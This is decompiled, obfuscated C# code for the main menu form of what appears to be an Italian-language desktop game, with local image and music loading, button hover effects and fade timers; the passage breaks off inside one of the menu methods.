using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class GForm1 : Form
{
	private int int_0;

	private int int_1;

	private float float_0;

	private bool bool_0;

	private bool bool_1;

	private IContainer icontainer_0;

	private bool bool_2;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("FadeGame")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox3")]
	private PictureBox pictureBox_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox4")]
	private PictureBox pictureBox_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox5")]
	[CompilerGenerated]
	private PictureBox pictureBox_4;

	[AccessedThroughProperty("MemoryCleaner")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_1;

	internal virtual PictureBox PictureBox_0
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_1;
			Timer val = default(Timer);
			while (true)
			{
				int num = 2047348073;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x3EE41B68u) % 7u)
					{
					case 6u:
						val = timer_0;
						num = ((int)num2 * -1784518737) ^ -255933572;
						continue;
					case 3u:
					{
						int num4;
						int num5;
						if (val == null)
						{
							num4 = -584340664;
							num5 = -584340664;
						}
						else
						{
							num4 = -1428405000;
							num5 = -1428405000;
						}
						num = num4 ^ (int)(num2 * 268987097);
						continue;
					}
					case 2u:
					{
						timer_0 = value;
						val = timer_0;
						int num3;
						if (val == null)
						{
							num = 51369824;
							num3 = 51369824;
						}
						else
						{
							num = 670535655;
							num3 = 670535655;
						}
						continue;
					}
					case 1u:
						GForm1.smethod_80(val, eventHandler_);
						num = (int)(num2 * 1322939815) ^ -1743806546;
						continue;
					case 0u:
						GForm1.smethod_81(val, eventHandler_);
						num = (int)(num2 * 172068887) ^ -1850859591;
						continue;
					default:
						return;
					case 5u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e8: Expected O, but got Unknown
			EventHandler eventHandler_ = method_2;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = 1819580319;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x756F361Eu) % 12u)
					{
					case 10u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 837070240) ^ -849275484;
						continue;
					case 9u:
						eventHandler_2 = method_3;
						num = (int)(num2 * 1371458001) ^ -2015725956;
						continue;
					case 8u:
						val = pictureBox_1;
						num = (int)((num2 * 1620943944) ^ 0x1374D728);
						continue;
					case 7u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = 1294869778;
							num6 = 1294869778;
						}
						else
						{
							num5 = 2078567254;
							num6 = 2078567254;
						}
						num = num5 ^ ((int)num2 * -1416134842);
						continue;
					}
					case 6u:
						pictureBox_1 = value;
						num = 732327798;
						continue;
					case 5u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -2130574440) ^ 0x286DC406;
						continue;
					case 4u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = (int)((num2 * 87637216) ^ 0x276E98CB);
						continue;
					case 3u:
						mouseEventHandler_ = new MouseEventHandler(method_4);
						val = pictureBox_1;
						num = ((int)num2 * -1286306204) ^ -2042603551;
						continue;
					case 2u:
					{
						int num3;
						int num4;
						if (val != null)
						{
							num3 = 575380040;
							num4 = 575380040;
						}
						else
						{
							num3 = 508550152;
							num4 = 508550152;
						}
						num = num3 ^ ((int)num2 * -1079779103);
						continue;
					}
					case 1u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -845228648) ^ -1518055029;
						continue;
					default:
						return;
					case 11u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00dc: Expected O, but got Unknown
			EventHandler eventHandler_ = method_5;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = -416304468;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xBB9EEFD0u) % 10u)
					{
					case 9u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -2136027568) ^ 0x59DC4647;
						continue;
					case 7u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 1783133680) ^ -1112016236;
						continue;
					case 6u:
						eventHandler_2 = method_6;
						num = ((int)num2 * -1905606248) ^ -768591197;
						continue;
					case 5u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1882874590) ^ -1143119944;
						continue;
					case 3u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = (int)((num2 * 337252124) ^ 0x1936B6F1);
						continue;
					case 2u:
					{
						pictureBox_2 = value;
						val = pictureBox_2;
						int num5;
						if (val != null)
						{
							num = -1349734703;
							num5 = -1349734703;
						}
						else
						{
							num = -1024774954;
							num5 = -1024774954;
						}
						continue;
					}
					case 1u:
						mouseEventHandler_ = new MouseEventHandler(method_7);
						val = pictureBox_2;
						num = (int)((num2 * 16993912) ^ 0x60E1AE54);
						continue;
					case 0u:
					{
						int num3;
						int num4;
						if (val != null)
						{
							num3 = 1471328389;
							num4 = 1471328389;
						}
						else
						{
							num3 = 120980508;
							num4 = 120980508;
						}
						num = num3 ^ (int)(num2 * 432455978);
						continue;
					}
					default:
						return;
					case 8u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			EventHandler eventHandler_ = method_8;
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			while (true)
			{
				int num = 1246232489;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x30B7A172u) % 10u)
					{
					case 9u:
						mouseEventHandler_ = new MouseEventHandler(method_10);
						val = pictureBox_3;
						num = ((int)num2 * -864638784) ^ 0x321223EE;
						continue;
					case 7u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 927286512) ^ -598308409;
						continue;
					case 6u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = (int)((num2 * 1183678601) ^ 0x4395FF8E);
						continue;
					case 5u:
						eventHandler_2 = method_9;
						num = ((int)num2 * -1049952749) ^ -2044320024;
						continue;
					case 4u:
					{
						pictureBox_3 = value;
						val = pictureBox_3;
						int num5;
						if (val != null)
						{
							num = 1168226626;
							num5 = 1168226626;
						}
						else
						{
							num = 749324408;
							num5 = 749324408;
						}
						continue;
					}
					case 2u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = 1124749160;
							num4 = 1124749160;
						}
						else
						{
							num3 = 944903369;
							num4 = 944903369;
						}
						num = num3 ^ ((int)num2 * -60432680);
						continue;
					}
					case 1u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 91343890) ^ -423745326;
						continue;
					case 0u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -788593723) ^ -351731452;
						continue;
					default:
						return;
					case 3u:
						break;
					case 8u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0033: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Expected O, but got Unknown
			EventHandler eventHandler_ = method_11;
			PictureBox val = default(PictureBox);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			EventHandler eventHandler_2 = default(EventHandler);
			while (true)
			{
				int num = -1648944623;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x86497C26u) % 13u)
					{
					case 12u:
						val = pictureBox_4;
						num = (int)((num2 * 1427833827) ^ 0x38917E68);
						continue;
					case 11u:
						mouseEventHandler_ = new MouseEventHandler(method_13);
						num = ((int)num2 * -925268858) ^ -1968140779;
						continue;
					case 10u:
						pictureBox_4 = value;
						val = pictureBox_4;
						num = -1708781168;
						continue;
					case 8u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = 1869776434;
							num6 = 1869776434;
						}
						else
						{
							num5 = 801297784;
							num6 = 801297784;
						}
						num = num5 ^ ((int)num2 * -1832965540);
						continue;
					}
					case 7u:
						eventHandler_2 = method_12;
						num = (int)(num2 * 1124067618) ^ -368225840;
						continue;
					case 5u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1229267470) ^ -1516892194;
						continue;
					case 4u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 1759213726) ^ -1004631258;
						continue;
					case 3u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = 589130085;
							num4 = 589130085;
						}
						else
						{
							num3 = 2097876614;
							num4 = 2097876614;
						}
						num = num3 ^ ((int)num2 * -390860172);
						continue;
					}
					case 2u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 806916358) ^ -423995395;
						continue;
					case 1u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -518060951) ^ -264445201;
						continue;
					case 0u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = (int)(num2 * 1037211839) ^ -2069085034;
						continue;
					default:
						return;
					case 9u:
						break;
					case 6u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_16;
			Timer val = default(Timer);
			while (true)
			{
				int num = -830698835;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xA505832Fu) % 8u)
					{
					case 7u:
						GForm1.smethod_81(val, eventHandler_);
						num = ((int)num2 * -827296058) ^ 0x67FDC498;
						continue;
					case 6u:
						timer_1 = value;
						num = -1742331813;
						continue;
					case 4u:
						val = timer_1;
						num = (int)(num2 * 1088486301) ^ -1407086382;
						continue;
					case 3u:
						GForm1.smethod_80(val, eventHandler_);
						num = (int)((num2 * 1665049995) ^ 0x27F28210);
						continue;
					case 2u:
					{
						val = timer_1;
						int num5;
						int num6;
						if (val != null)
						{
							num5 = -269359662;
							num6 = -269359662;
						}
						else
						{
							num5 = -356166241;
							num6 = -356166241;
						}
						num = num5 ^ (int)(num2 * 1300619019);
						continue;
					}
					case 1u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -1781385148;
							num4 = -1781385148;
						}
						else
						{
							num3 = -1899903154;
							num4 = -1899903154;
						}
						num = num3 ^ (int)(num2 * 1084114758);
						continue;
					}
					default:
						return;
					case 0u:
						break;
					case 5u:
						return;
					}
					break;
				}
			}
		}
	}

	public GForm1()
	{
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		while (true)
		{
			int num = 1875824854;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x691520C9u) % 10u)
				{
				case 9u:
					num = ((int)num2 * -299376095) ^ -1653638884;
					continue;
				case 8u:
					int_0 = 0;
					int_1 = 0;
					float_0 = 0.3f;
					num = ((int)num2 * -1862883616) ^ 0x6F6C4BDB;
					continue;
				case 6u:
					bool_0 = false;
					bool_1 = false;
					num = ((int)num2 * -1985111289) ^ -1780730848;
					continue;
				case 5u:
					bool_2 = false;
					num = (int)(num2 * 1131928986) ^ -184572799;
					continue;
				case 4u:
					num = (int)(num2 * 1821845894) ^ -1507045851;
					continue;
				case 2u:
					GForm1.smethod_9((Form)(object)this, new FormClosingEventHandler(method_15));
					num = (int)(num2 * 1195382479) ^ -2076266403;
					continue;
				case 1u:
					GForm1.smethod_8((Form)(object)this, (EventHandler)method_0);
					num = (int)(num2 * 1497313793) ^ -1476570403;
					continue;
				case 0u:
					method_17();
					num = ((int)num2 * -2005092066) ^ -831522022;
					continue;
				default:
					return;
				case 3u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Class3_0.GForm1_0);
	}

	private void method_0(object sender, EventArgs e)
	{
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 584517944;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x60977D55u) % 61u)
				{
				case 60u:
					GForm1.smethod_20((object)int_0);
					num = (int)((num2 * 661287088) ^ 0x778B297);
					continue;
				case 59u:
					num = ((int)num2 * -1272748395) ^ -350836321;
					continue;
				case 58u:
				{
					int num7;
					int num8;
					if (!GClass1.bool_1)
					{
						num7 = 90093077;
						num8 = 90093077;
					}
					else
					{
						num7 = 292055941;
						num8 = 292055941;
					}
					num = num7 ^ ((int)num2 * -1862675803);
					continue;
				}
				case 57u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png"));
					num = ((int)num2 * -1545823715) ^ -330996190;
					continue;
				case 56u:
					num = 897500617;
					continue;
				case 54u:
					num = (int)((num2 * 1577406583) ^ 0x3C95FC3F);
					continue;
				case 53u:
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music"));
					num = ((int)num2 * -1083980733) ^ 0x43660BD3;
					continue;
				case 52u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
					num = ((int)num2 * -1764697525) ^ 0x4F580EE;
					continue;
				case 51u:
					num = (int)((num2 * 111311166) ^ 0x2157001B);
					continue;
				case 50u:
					flag = !GClass1.bool_1;
					num = (int)((num2 * 479170934) ^ 0x37AE078C);
					continue;
				case 49u:
					num = ((int)num2 * -666848163) ^ -135436510;
					continue;
				case 48u:
					num = (int)(num2 * 187696408) ^ -557636492;
					continue;
				case 47u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png"));
					num = ((int)num2 * -227447866) ^ 0x613D53A2;
					continue;
				case 46u:
					GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")), 0.1f));
					num = (int)((num2 * 1109493041) ^ 0x7598229E);
					continue;
				case 45u:
					GClass1.smethod_1().method_0();
					num = (int)((num2 * 1100150682) ^ 0x35995DC5);
					continue;
				case 44u:
					GClass1.bool_1 = true;
					num = ((int)num2 * -1607270491) ^ 0x849125E;
					continue;
				case 43u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					num = (int)((num2 * 792242573) ^ 0x34E76F01);
					continue;
				case 42u:
					num = (int)(num2 * 707412650) ^ -1743716735;
					continue;
				case 41u:
					num = 374977244;
					continue;
				case 40u:
					GForm1.smethod_18(Timer_1);
					num = ((int)num2 * -903210386) ^ 0x39C26A64;
					continue;
				case 39u:
					GForm1.smethod_19();
					num = ((int)num2 * -2111208920) ^ 0x7E7F86CB;
					continue;
				case 38u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = ((int)num2 * -1597233264) ^ -386021363;
					continue;
				case 37u:
					flag2 = GClass1.bool_1;
					num = ((int)num2 * -605812665) ^ -1033468066;
					continue;
				case 36u:
					bool_0 = true;
					num = (int)(num2 * 1449845644) ^ -1760160847;
					continue;
				case 35u:
					GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), 0.1f));
					num = ((int)num2 * -1647964041) ^ 0x35ACC694;
					continue;
				case 34u:
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data"));
					num = ((int)num2 * -731189144) ^ -1976004260;
					continue;
				case 33u:
					GForm1.smethod_19();
					num = ((int)num2 * -1059570342) ^ -161750921;
					continue;
				case 32u:
					num = (int)((num2 * 1346480651) ^ 0x2560C3FA);
					continue;
				case 31u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\main_menu_theme.mp3"));
					num = ((int)num2 * -919565970) ^ -1871763580;
					continue;
				case 30u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png"));
					num = (int)((num2 * 15341018) ^ 0x220A5BA3);
					continue;
				case 28u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\horror_music.mp3"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\schermata_omegle.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\marco_introduzione.png"));
					num = (int)((num2 * 108777840) ^ 0x16D4C992);
					continue;
				case 27u:
					GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")), 0.1f));
					num = ((int)num2 * -909760538) ^ -1047695393;
					continue;
				case 26u:
					num = (int)(num2 * 985486587) ^ -1678964806;
					continue;
				case 25u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_gli_altri.png"));
					num = ((int)num2 * -1362611448) ^ 0x1F6B9B1A;
					continue;
				case 24u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png"));
					num = ((int)num2 * -1675804410) ^ -2099793007;
					continue;
				case 23u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png"));
					num = (int)((num2 * 597951143) ^ 0x65AC68D);
					continue;
				case 22u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\introduction_start_music.mp3"));
					GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
					num = ((int)num2 * -1440486870) ^ 0x171BE87E;
					continue;
				case 21u:
					bool_1 = false;
					GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
					num = (int)(num2 * 459779989) ^ -53894526;
					continue;
				case 20u:
					GForm1.smethod_12(GForm1.smethod_11(), ProcessPriorityClass.RealTime);
					num = ((int)num2 * -997402631) ^ -728026753;
					continue;
				case 19u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					num = ((int)num2 * -1578113979) ^ 0x5D90BE32;
					continue;
				case 18u:
				{
					int num5;
					int num6;
					if (!flag2)
					{
						num5 = -326442184;
						num6 = -326442184;
					}
					else
					{
						num5 = -1151157464;
						num6 = -1151157464;
					}
					num = num5 ^ ((int)num2 * -1004444139);
					continue;
				}
				case 17u:
					num = ((int)num2 * -1770218183) ^ 0x7AD3E6A2;
					continue;
				case 16u:
					GForm1.smethod_20((object)float_0);
					num = ((int)num2 * -1187922926) ^ -610430482;
					continue;
				case 15u:
					num = (int)((num2 * 1609868884) ^ 0x40A4E95D);
					continue;
				case 14u:
					GClass1.smethod_0();
					num = (int)((num2 * 299295693) ^ 0xA0C5909);
					continue;
				case 13u:
					GForm1.smethod_20((object)int_1);
					num = (int)((num2 * 1300710027) ^ 0x609614CC);
					continue;
				case 12u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png"));
					num = (int)((num2 * 1616501580) ^ 0x4068FFD6);
					continue;
				case 11u:
					num = ((int)num2 * -1483233729) ^ -12838066;
					continue;
				case 10u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1268361816;
						num4 = -1268361816;
					}
					else
					{
						num3 = -1051411313;
						num4 = -1051411313;
					}
					num = num3 ^ ((int)num2 * -64586770);
					continue;
				}
				case 9u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg"));
					num = ((int)num2 * -1484171972) ^ 0x3FABA6D9;
					continue;
				case 8u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png"));
					num = (int)(num2 * 2088586294) ^ -2014748590;
					continue;
				case 7u:
					num = ((int)num2 * -1944247264) ^ -645172682;
					continue;
				case 6u:
					GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")), 0.1f));
					num = (int)(num2 * 75955218) ^ -651933610;
					continue;
				case 5u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\fai_un_duello.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\dark_story.jpg"));
					num = ((int)num2 * -1136460756) ^ -1422866047;
					continue;
				case 4u:
					GForm1.smethod_18(Timer_0);
					num = (int)(num2 * 2071737198) ^ -189960497;
					continue;
				case 3u:
					num = (int)((num2 * 701174887) ^ 0x5340087D);
					continue;
				case 2u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu_hover.png"));
					num = ((int)num2 * -1667321898) ^ 0x475AFB47;
					continue;
				case 1u:
					GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")), 0.1f));
					num = ((int)num2 * -1392620884) ^ 0x4399C181;
					continue;
				case 0u:
					num = (int)((num2 * 411644840) ^ 0x5CC19105);
					continue;
				default:
					return;
				case 29u:
					break;
				case 55u:
					return;
				}
				break;
			}
		}
	}

	public static Bitmap smethod_0(Image image_0, float float_1)
	{
		Bitmap result = default(Bitmap);
		Bitmap val = default(Bitmap);
		Graphics graphics_ = default(Graphics);
		ColorMatrix colorMatrix_ = default(ColorMatrix);
		ImageAttributes imageAttributes_ = default(ImageAttributes);
		while (true)
		{
			int num = -1914844395;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x85E67333u) % 9u)
				{
				case 8u:
					result = val;
					num = (int)((num2 * 1706284718) ^ 0x7FFA81);
					continue;
				case 7u:
					val = GForm1.smethod_23(GForm1.smethod_21(image_0), GForm1.smethod_22(image_0));
					graphics_ = GForm1.smethod_24((Image)(object)val);
					colorMatrix_ = GForm1.smethod_25();
					num = ((int)num2 * -273190009) ^ -1799058093;
					continue;
				case 5u:
					num = (int)(num2 * 1405599756) ^ -1082984587;
					continue;
				case 3u:
					GForm1.smethod_29(graphics_, image_0, new Rectangle(0, 0, GForm1.smethod_21((Image)(object)val), GForm1.smethod_22((Image)(object)val)), 0, 0, GForm1.smethod_21(image_0), GForm1.smethod_22(image_0), (GraphicsUnit)2, imageAttributes_);
					num = (int)((num2 * 383330963) ^ 0x6A5B7B9A);
					continue;
				case 2u:
					GForm1.smethod_26(colorMatrix_, float_1);
					imageAttributes_ = GForm1.smethod_27();
					GForm1.smethod_28(imageAttributes_, colorMatrix_, (ColorMatrixFlag)0, (ColorAdjustType)1);
					num = ((int)num2 * -788135984) ^ 0x4C438323;
					continue;
				case 1u:
					num = ((int)num2 * -589589198) ^ -1533380520;
					continue;
				case 0u:
					GForm1.smethod_30(graphics_);
					num = ((int)num2 * -379444155) ^ -1808751323;
					continue;
				case 4u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		if (((int_0 <= 15) & (int_1 == 0)) | ((int_0 <= 9) & (int_1 != 0)))
		{
			goto IL_0539;
		}
		goto IL_07e3;
		IL_07e3:
		int num = -1553447215;
		goto IL_06f4;
		IL_06f4:
		bool flag4 = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x84FD036Eu) % 55u)
			{
			case 53u:
				flag4 = int_1 == 5;
				num = ((int)num2 * -763135763) ^ 0x33301BD4;
				continue;
			case 52u:
				num = (int)(num2 * 726580009) ^ -1422976929;
				continue;
			case 51u:
				GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_2), float_0));
				num = (int)((num2 * 1487834266) ^ 0x204A438F);
				continue;
			case 50u:
				flag3 = int_1 == 4;
				num = -632515952;
				continue;
			case 49u:
				num = (int)((num2 * 781541301) ^ 0x698DD40C);
				continue;
			case 48u:
				float_0 = 0.3f;
				flag2 = int_1 == 1;
				num = (int)(num2 * 970716187) ^ -1323112417;
				continue;
			case 47u:
				num = (int)(num2 * 1879313907) ^ -479448320;
				continue;
			case 46u:
			{
				int num5;
				int num6;
				if (flag)
				{
					num5 = 1066063359;
					num6 = 1066063359;
				}
				else
				{
					num5 = 247496684;
					num6 = 247496684;
				}
				num = num5 ^ (int)(num2 * 543212294);
				continue;
			}
			case 45u:
			{
				int num9;
				int num10;
				if (!flag4)
				{
					num9 = -1757883807;
					num10 = -1757883807;
				}
				else
				{
					num9 = -1900767770;
					num10 = -1900767770;
				}
				num = num9 ^ ((int)num2 * -1308175496);
				continue;
			}
			case 44u:
				num = ((int)num2 * -1794848151) ^ -1526266667;
				continue;
			case 43u:
				bool_0 = true;
				GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
				GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
				num = ((int)num2 * -974707491) ^ 0x10350F84;
				continue;
			case 42u:
				num = (int)(num2 * 640350358) ^ -470247054;
				continue;
			case 41u:
				num = (int)((num2 * 1262356235) ^ 0x6688A2A5);
				continue;
			case 40u:
				num = -81828350;
				continue;
			case 39u:
				GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_1), float_0));
				num = ((int)num2 * -934743755) ^ 0xC18926D;
				continue;
			case 38u:
			{
				ref float reference5 = ref float_0;
